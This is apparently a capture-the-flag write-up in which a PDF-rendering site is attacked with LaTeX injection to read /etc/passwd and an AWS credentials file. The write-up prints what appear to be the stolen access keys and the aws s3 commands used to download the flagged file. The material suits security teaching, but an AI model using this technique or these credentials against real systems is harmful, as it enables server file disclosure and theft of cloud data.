# Notes
**Category: Web**

This challenge will take an input and render it as a PDF:

<img src="images/home.png" width="50%">

The PDF.js library logged a result to the console: `PDF 3a7b66944d4e7ee9f77b1dede8dbb10c [1.5 pdfTeX-1.40.22 / TeX] (PDF.js: 2.14.305)`

This exposes that these are generated with pdfTeX. We can try a malicious LaTeX command and see if it works:

<img src="images/passwd.png">

This works, and also shows us we have a user directory in `/home/professor`.

The site mentioned AWS credentials, let's fetch those:

<img src="images/aws.png">

I modified my own credentials file to contain the professor's login:

```
[default]
aws_access_key_id = AKIAS6CCIWVV6RMQNP6C
aws_secret_access_key = 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
```

```
$ aws s3 ls
2022-06-10 14:49:19 professorsnotes

$ aws s3 ls professorsnotes
2022-06-10 14:54:24     867970 certificate.pdf

$ aws s3 cp s3://professorsnotes/certificate.pdf .
download: s3://professorsnotes/certificate.pdf to ./certificate.pdf
```

The certificate contains the flag!

<img src="images/flag.png" width="50%">
